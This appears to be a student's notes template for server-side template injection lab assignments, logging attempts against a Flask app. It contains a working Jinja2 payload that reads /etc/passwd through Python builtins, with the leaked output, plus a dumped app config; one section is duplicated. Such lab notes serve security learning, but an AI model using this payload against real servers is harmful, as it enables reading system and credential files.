# Reusable Notes Template for SSTI Harder Assignments

Use this skeleton to create a section for each attempt, input, or bypass you work on. Copy and paste as needed.

---

## Read /etc/passwd

- **Input Source**:
  - comments

- **Payload Used**:
  - {{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

- **Server Response / Behavior**:
  - `Your comments: root:x:0:0:root:/root:/usr/bin/zsh...`

- **Was Execution Achieved?**:
  - (Yes/No)

- **Bypass Technique (if any)**:
  - None

- **Challenges Encountered**:
  - None

- **Notes**:
  - 

---

## Reading config

- **Input Source**:
  - email

- **Payload Used**:
  - 

- **Server Response / Behavior**:
```
  Your email: <Config {'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'SECRET_KEY_FALLBACKS': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'TRUSTED_HOSTS': None, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PARTITIONED': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'MAX_FORM_MEMORY_SIZE': 500000, 'MAX_FORM_PARTS': 1000, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'PROVIDE_AUTOMATIC_OPTIONS': True}> 
```

- **Was Execution Achieved?**:
  - Yes

- **Bypass Technique (if any)**:
  - None

- **Challenges Encountered**:
  - None

- **Notes**:
  - 

---

## Read /etc/passwd

- **Input Source**:
  - comments

- **Payload Used**:
  - {{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

- **Server Response / Behavior**:
  - `Your comments: root:x:0:0:root:/root:/usr/bin/zsh...`

- **Was Execution Achieved?**:
  - (Yes/No)

- **Bypass Technique (if any)**:
  - None

- **Challenges Encountered**:
  - None

- **Notes**:
  - 

---

(Repeat this template for each input tested or major payload attempt.)

